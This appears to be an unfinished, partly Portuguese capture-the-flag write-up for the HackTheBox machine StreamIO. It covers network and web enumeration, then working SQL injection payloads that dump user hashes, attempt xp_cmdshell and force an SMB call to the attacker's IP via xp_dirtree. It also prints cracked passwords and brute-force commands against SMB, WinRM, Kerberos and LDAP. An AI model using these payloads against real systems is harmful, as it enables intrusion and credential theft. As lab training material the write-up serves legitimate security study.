StreamIo
========================

# Enumeration

    sudo nmap_enum 10.10.11.158 | tee nmap_output.txt

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.11.158 | tee nmap_udp_output.txt

![qownnotes-media-UDMSdX](../../../media/qownnotes-media-UDMSdX.png)


    sudo nmap -p- -Pn -T5 -n 10.10.11.158 | tee nmap_fullportstcp_output.txt
![qownnotes-media-CcKSJx](../../../media/qownnotes-media-CcKSJx.png)

    enum4linux -a 10.10.11.158
    
    crackmapexec smb 10.10.11.158
    
    domain:streamIO.htb
    
![qownnotes-media-sIqNpf](../../../media/qownnotes-media-sIqNpf.png)

    rpcclient -N -U '' 10.10.11.158
    
    smbclient -L //10.10.11.158

![qownnotes-media-oYiqLZ](../../../media/qownnotes-media-oYiqLZ.png)

    gobuster dir -u http://10.10.11.158 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
![qownnotes-media-XqKwOR](../../../media/qownnotes-media-XqKwOR.png)

    gobuster dir -u http://10.10.11.158 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_jeeves_gobuster.txt"

![qownnotes-media-pqgIRe](../../../media/qownnotes-media-pqgIRe.png)

    gobuster dir -u https://10.10.11.158 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_443_protocol_streamio_gobuster.txt"
    
    gobuster dir -u https://10.10.11.158 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php" -k -t 16 -o "tcp_port_443_protocol_gobuster.txt"
    
    sudo nmap -sC -sV -Pn -T5 -n 10.10.11.158 -p 53,464,593,3268,3269,9389
    
    gobuster dir -u https://10.10.11.158 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php" -k -t 16 -o "tcp_port_443_protocol_gobuster.txt"
    
    gobuster dir -u https://10.10.11.158 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_443_protocol_streamio_gobuster.txt"
  
  
  ![qownnotes-media-OxOGnj](../../../media/qownnotes-media-OxOGnj.png)

    import ldap3
    server = ldap3.Server('10.10.11.158', get_info=ldap3.ALL, port=389, use_ssl=False)
    connection = ldap3.Connection(server)
    connection.bind()
    server.info
    
![qownnotes-media-ebrWHf](../../../media/qownnotes-media-ebrWHf.png)

    nmap -Pn -sV -p 389,3269,3268 --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_port_ldap_nmap.txt" 10.10.11.158


    wfuzz -u https://streamio.htb -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315

![qownnotes-media-CCtMJJ](../../../media/qownnotes-media-CCtMJJ.png)

    gobuster dir -u https://watch.streamio.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx" -k -t 16 -o "tcp_port_protocol_watch_ext_gobuster.txt"


# Exploitation

## SQL INJECTION

Referência

<https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340>

    curl https://watch.streamio.htb/Search.php -k --data "q=series' union select 1,@@version,3,4,5,6;--"

    q=series' union select 1,@@version,3,4,5,6;--
    
    
    q=series' union select 1,CURRENT_USER,3,4,5,6;--
    db_user

![qownnotes-media-dQOJju](../../../media/qownnotes-media-dQOJju.png)

    q=series' union select 1,CONCAT(username,':',password),3,4,5,6 from users;--
    
![qownnotes-media-iVanLl](../../../media/qownnotes-media-iVanLl.png)

  
    cat creds.txt                                                                                                                                                                                                                           
    admin:665a50ac9eaa781e4f7f04199db97a11    
    Alexendra:1c2b3d8270321140e5153f6637d3ee53    
    Austin:0049ac57646627b8d7aeaccf8b6a936f    
    Barbra:3961548825e3e21df5646cafe11c6c76    
    Barry:54c88b2dbd7b1a84012fabc1a4c73415    
    Baxter:22ee218331afd081b0dcd8115284bae3    
    Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8    
    Carmon:35394484d89fcfdb3c5e447fe749d213    
    Clara:ef8f3d30a856cf166fb8215aca93e9ff    
    Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5    
    Garfield:8097cedd612cc37c29db152b6e9edbd3    
    Gloria:0cfaaaafb559f081df2befbe66686de0    
    James:c660060492d9edcaa8332d89c99c9239    
    Juliette:6dcd87740abb64edfa36d170f0d5450d    
    Lauren:08344b85b329d7efd611b7a7743e8a09    
    Lenord:ee0b8a0937abd60c2882eacb2f8dc49f    
    Lucifer:7df45a9e3de3863807c026ba48e55fb3    
    Michelle:b83439b16f844bd6ffe35c02fe21b3c0    
    Oliver:fd78db29173a5cf701bd69027cb9bf6b    
    Robert:f03b910e2bd0313a23fdd7575f34a694    
    Robin:dc332fb5576e9631c9dae83f194f8e70    
    Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5    
    Samantha:083ffae904143c4796e464dac33c1f7d    
    Stan:384463526d288edcc95fc3701e523bc7    
    Thane:3577c47eb1e12c8ba021611e1280753c    
    Theodore:925e5408ecb67aea449373d668b7359e    
    Victor:bf55e15b119860a6e6b5a164377da719    
    Victoria:b22abb47a02b52d5dfa27fb0b534f693    
    William:d62be0dc82071bccc1322d64ec5b6c51    
    yoshihide:b779ba15cedfd22a023c4d8bcf5f2332

    x=1; for i in `cat creds.txt`; do echo $i > file$x.txt; x=$((x++)); done

    for i in `ls file*`; do john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt $i; done >> senhas.txt
    cat senhas.txt | grep -v Loaded
    awk {'print $2":"$1'} senhas.txt | sed 's/(//' | sed 's/)//' > creds.txt
    
## Creds

Juliette:$3xybitch
Clara:%$clara
Barry:$hadoW
Bruno:$monique$1991$
Lauren:##123a8j8w5123##
yoshihide:66boysandgirls..
Michelle:!?Love?!123
Lenord:physics69i
Sabrina:!!sabrina$


    q=series' union select 1,is_srvrolemember('sysadmin'),3,4,5,6 from users;--
    # Esse ultimo comando deveria retornar 1, porem retornou 0

![qownnotes-media-flfUQc](../../../media/qownnotes-media-flfUQc.png)

    q=series' union select 1,2,3,4,5,6 from users; EXEC xp_cmdshell 'ipconfig'--
 
 ![qownnotes-media-DGwEiY](../../../media/qownnotes-media-DGwEiY.png)

 Nao funcionou

    q=series' union select 1,2,3,4,5,6; exec master..xp_dirtree '\\10.10.14.5\test'--

    
## Brute Forcing

    crackmapexec smb 10.10.11.158 -u users.txt -p passwords.txt
 
    
    crackmapexec winrm 10.10.11.158 -u users.txt -p passwords.txt
    
    kerbrute userenum --dc 10.10.11.158 -d streamio.htb users.txt
    
    kerbrute bruteuser --dc 10.10.11.158 -d streamio.htb /usr/share/wordlists/rockyou.txt yoshihide
    
    hydra -L users.txt -P passwords.txt 10.10.11.158 ldap2 -V -f
    

## WebEnum

    gobuster dir -u https://streamio.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 16 -o "tcp_port_protocol_gobuster_autenticado.txt" -c "PHPSESSID=iijak2sj64mghckom5220vo5vo"
    
    gobuster dir -u https://streamio.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,php,aspx,asp,html" -k -t 16 -o "tcp_port_protocol_gobuster_autenticado.txt" -c "PHPSESSID=iijak2sj64mghckom5220vo5vo"
 
![qownnotes-media-eNPmCS](../../../media/qownnotes-media-eNPmCS.png)

Aumentando aqui o portfólio de ferramentas, vou tentar com wfuzz explorar a vulneraabilidade presente no parâmetro da aplicação:

    wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 1678 -H "Cookie: PHPSESSID=iijak2sj64mghckom5220vo5vo" https://streamio.htb/admin/?FUZZ=index.php

Aqui vale explicar que se trata do seguinte...

-c -> cor na resposta
-z file,/caminho/arquivo/texto -> onde informa os inputs para fuzzear
--hh -> hide esconder numero de caracteres
-H -> Adicionar um cabeçalho custom no comando
<URL> final

![qownnotes-media-evKxgA](../../../media/qownnotes-media-evKxgA.png)

![qownnotes-media-LrwebE](../../../media/qownnotes-media-LrwebE.png)

Encontamos uma vulnerabilidde de LFI nesse cara



NÃO TERMINADO